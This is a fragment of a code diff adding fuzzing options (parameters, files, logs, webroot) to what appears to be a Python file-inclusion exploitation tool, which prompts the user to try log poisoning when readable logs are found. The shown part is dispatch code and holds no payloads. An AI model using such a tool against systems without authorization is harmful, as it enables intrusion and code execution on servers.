+            print(f"\n{Fore.RED}[✗] No vulnerable parameters found!{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[TIP] Try:{Style.RESET_ALL}")
+            print(f"  1. Use a larger wordlist: --wordlist /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt")
+            print(f"  2. Try different pages on the target")
+            print(f"  3. Manual testing with known parameter: -p file")
+            sys.exit(1)
     
     # Generate mode
     if args.generate:
@@ -2240,6 +2876,35 @@ Ghost Ops Security | For Authorized Testing Only
         # Restore original values
         exploiter.target_url = original_url
         exploiter.parameter = original_param
+        sys.exit(0)
+    
+    # Fuzzing modules
+    if args.fuzz_params:
+        exploiter.fuzz_parameters(args.wordlist)
+        sys.exit(0)
+    
+    if args.fuzz_files:
+        exploiter.fuzz_files(args.wordlist)
+        sys.exit(0)
+    
+    if args.fuzz_logs:
+        exploiter.fuzz_logs()
+        sys.exit(0)
+    
+    if args.fuzz_webroot:
+        exploiter.fuzz_webroot(args.wordlist)
+        sys.exit(0)
+    
+    if args.fuzz_all:
+        results = exploiter.fuzz_all()
+        
+        # If logs found, ask if user wants to try log poisoning
+        if results.get('logs'):
+            print(f"\n{Fore.YELLOW}[?] Found readable logs. Try log poisoning?{Style.RESET_ALL}")
+            choice = input(f"{Fore.YELLOW}[y/N]: {Style.RESET_ALL}").strip().lower()
+            if choice == 'y':
+                exploiter.test_log_poisoning()
+        
         sys.exit(0)
     
     if args.test_rfi:
